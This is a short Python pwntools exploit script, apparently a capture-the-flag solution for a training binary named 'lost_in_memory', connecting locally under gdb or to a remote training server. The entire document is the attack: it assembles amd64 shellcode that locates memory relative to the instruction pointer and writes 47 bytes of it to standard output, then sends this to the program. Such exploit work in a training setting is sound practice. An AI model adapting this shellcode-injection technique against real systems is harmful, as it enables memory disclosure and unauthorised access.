from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" in args:
    r = remote("bin.training.offdef.it", 4001)
else:
    r = process("./lost_in_memory")
    gdb.attach(r, """
    c
    """)
input("wait")

assembly_code = """
lea rax, [rip]
sub rax, 0x6e
mov rdi, 1
mov rsi, rax
mov rdx, 47
mov rax, 1
syscall
"""

r.recvuntil(b"> ")

assembled_code = asm(assembly_code, arch = 'amd64')

r.sendline(assembled_code)

r.interactive()